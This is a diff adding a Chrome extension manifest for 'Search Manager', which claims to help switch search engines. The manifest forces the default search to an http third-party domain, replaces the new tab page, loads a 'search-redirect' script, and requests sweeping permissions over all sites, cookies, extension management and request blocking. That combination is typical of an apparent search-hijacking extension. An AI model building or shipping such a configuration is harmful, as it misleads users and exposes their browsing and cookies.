@@ -1,0 +1,48 @@
+{
+   "background": {
+      "persistent": true,
+      "scripts": [ "/content/external/underscore-min.js", "/content/external/string.min.js", "/content/external/jquery-2.1.1.min.js", "/content/search/search-engines.js", "/content/chrome/settings.js", "/content/common/prefs-sys.js", "/content/common/prefs.js", "/content/common/conf-sys.js", "/content/common/conf.js", "/content/common/settings-dev.js", "/content/external/md5.min.js", "/content/chrome/utils.js", "/content/chrome/common.js", "/content/common/abtest.js", "/content/common/udata.js", "/content/chrome/setup.js", "/content/common/nt_ptr.js", "/content/chrome/lifecycle.js", "/content/search/search-redirect.js" ]
+   },
+   "browser_action": {
+      "default_icon": {
+         "128": "/skin/icons/128.png",
+         "16": "/skin/icons/16.png",
+         "48": "/skin/icons/48.png"
+      }
+   },
+   "chrome_settings_overrides": {
+      "search_provider": {
+         "encoding": "UTF-8",
+         "favicon_url": "http://srch.bar/?favicon",
+         "image_url": "",
+         "instant_url": "",
+         "is_default": true,
+         "keyword": "SM",
+         "name": "Search Manager",
+         "params": "__PARAM__",
+         "search_url": "http://srch.bar/{searchTerms}",
+         "suggest_url": "http://srch.bar/?s={searchTerms}"
+      }
+   },
+   "chrome_url_overrides": {
+      "newtab": "/content/newtab.html"
+   },
+   "content_security_policy": "script-src 'self' https://www.youtube.com https://s.ytimg.com; object-src 'self'",
+   "description": "This extensions lets you to easily switch between search engines directly from the new tab page",
+   "icons": {
+      "128": "/skin/icons/128.png",
+      "16": "/skin/icons/16.png",
+      "48": "/skin/icons/48.png"
+   },
+   "key": "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAvPyNUnGxs3O26aLdkc6rClYDyC55AJZG4EY6dMx/WmIXq9SzdEKYD+DFKmvCLxa/3xbyQAygzrhmLnLHgFtP78JvuePJLjXiGw2+Ugqgh2BWYFZcods9uevm+sFXUelO/NkGXWwohkwO/kwboppjdoXRFfVf/fl2otBNh/JgU00gphBChym828Vb6mUBWDnFJw6zHuAgUnUrJpK5TlLcrQtxLWqBRRb9d+eKJGLgD2PbrUoqBU7Sw1aKVMyVO+vhKC69FePlxI8YcEZgYmNMnB9MAJh/UYNdRzH191G+dH7Q8dJPQkegmDHHVIJtyId6nuY2siWSTiU9nhlRL/eKEwIDAQAB",
+   "manifest_version": 2,
+   "minimum_chrome_version": "32",
+   "name": "Search Manager",
+   "permissions": [ "\u003Call_urls>", "management", "storage", "cookies", "tabs", "webRequest", "webRequestBlocking", "unlimitedStorage", "contextMenus", "bookmarks", "topSites" ],
+   "sandbox": {
+      "pages": [  ]
+   },
+   "update_url": "https://clients2.google.com/service/update2/crx",
+   "version": "1.0.10.42",
+   "web_accessible_resources": [ "/skin/icons/16.png" ]
+}
